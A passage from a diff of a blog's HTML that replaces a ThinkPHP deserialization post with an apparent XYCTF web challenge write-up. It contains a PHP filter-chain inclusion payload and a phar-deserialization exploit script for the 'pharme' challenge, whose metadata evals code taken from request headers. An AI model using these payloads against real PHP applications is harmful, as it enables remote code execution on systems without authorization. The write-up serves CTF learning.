UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=/readflag
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="/../images/image-20240429203909728.png" alt="image-20240429203909728"></p>
+<h1 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h1><p>class.php</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+class evil&#123;
+    public $cmd;
+    public $a;
+    public function __destruct()&#123;
+        if(&#39;ch3nx1&#39; === preg_replace(&#39;/;+/&#39;,&#39;ch3nx1&#39;,preg_replace(&#39;/[A-Za-z_\(\)]+/&#39;,&#39;&#39;,$this-&gt;cmd)))&#123;
+            eval($this-&gt;cmd.&#39;isbigvegetablechicken!&#39;);
+        &#125; else &#123;
+            echo &#39;nonono&#39;;
+        &#125;
+    &#125;
+&#125;
+
+if(isset($_POST[&#39;file&#39;]))
+&#123;
+    if(preg_match(&#39;/^phar:\/\//i&#39;,$_POST[&#39;file&#39;]))
+    &#123;
+        die(&quot;nonono&quot;);
+    &#125;
+    file_get_contents($_POST[&#39;file&#39;]);
+&#125;
+</code></pre>
+<p>exp</p>
+<pre><code class="php">&lt;?php
+class evil&#123;
+    public $cmd=&quot;eval(end(getallheaders()));__halt_compiler();&quot;;
+    public $a;
+&#125;
+
+$h = new evil();
+$phar = new Phar(&#39;exp.phar&#39;);
+$phar -&gt; startBuffering();
+$phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;); //设置stub 增加gif文件头
+$phar -&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;); //添加要压缩的文件
+$object = $h;
+$phar -&gt; setMetadata($object); //将自定义meta-data存入manifest
+$phar -&gt; stopBuffering();
+
+
+?&gt;
+</code></pre>
+<p>生成文件后在class.php触发</p>
 
         </div>
 
@@ -495,18 +529,18 @@ namespace&#123;
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> ThinkPHP6.0.13反序列化(CVE-2022-38352)分析</li>
+        <li><strong>Title:</strong> XYCTF Web题解</li>
         <li><strong>Author:</strong> p0l1st&#39;s blog</li>
         <li><strong>Created at
-                :</strong> 2024-07-10 16:15:56</li>
+                :</strong> 2024-04-29 21:16:22</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-08-22 18:24:43
+                    :</strong> 2024-04-29 21:17:47
             </li>
         
         <li>
-            <strong>Link:</strong> https://redefine.ohevan.com/2024/07/10/ThinkPHP6-0-13反序列化-CVE-2022-38352-分析/
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/04/29/XYCTF-Web题解/
         </li>
         <li>
             <strong>
@@ -528,7 +562,7 @@ namespace&#123;
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">#代码审计</a>&nbsp;
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -542,13 +576,13 @@ namespace&#123;
                     <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="prev"
                         rel="prev"
-                        href="/2024/07/16/ThinkPHP8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
+                        href="/2024/06/01/LitCTF2024-web%E9%A2%98%E8%A7%A3/"
                         >
                             <span class="left arrow-icon flex justify-center items-center">
                                 <i class="fa-solid fa-chevron-left"></i>
                             </span>
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">ThinkPHP8反序列化利用链分析</span>
+                                <span class="post-nav-title-item">LitCTF2024 Web题解</span>
                                 <span class="post-nav-item">Prev posts</span>
                             </span>
                         </a>
@@ -558,10 +592,10 @@ namespace&#123;
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/07/10/ThinkPHP6-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"
+                        href="/2024/02/19/SICTF-Round-3-Web%E9%83%A8%E5%88%86wp/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">ThinkPHP6.0.X反序列化利用链</span>
+                                <span class="post-nav-title-item">SICTF Round3 Web题解</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -625,8 +659,8 @@ namespace&#123;
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">ThinkPHP6.0.13反序列化(CVE-2022-38352)分析</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="nav-text">漏洞环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PoC"><span class="nav-text">PoC</span></a></li></ol>
+        <div class="page-title">XYCTF Web题解</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ezPOP"><span class="nav-text">ezPOP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="nav-text">我是一个复读机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ZZL%E7%9A%84%E6%8A%A4%E7%90%86%E5%B0%8F%E8%AF%BE%E5%A0%82"><span class="nav-text">ZZL的护理小课堂</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9E%E8%BF%9E%E7%9C%8B%E5%88%B0%E5%BA%95%E6%98%AF%E8%BF%9E%E8%BF%9E%E4%BB%80%E4%B9%88%E7%9C%8B"><span class="nav-text">连连看到底是连连什么看</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%CE%B5Z-%C2%BF%D0%BC-K%CE%B5%C2%BF"><span class="nav-text">εZ?¿м@Kε¿?</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#login"><span class="nav-text">login</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezLFI"><span class="nav-text">ezLFI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pharme"><span class="nav-text">pharme</span></a></li></ol>
 
     </div>
 </div>
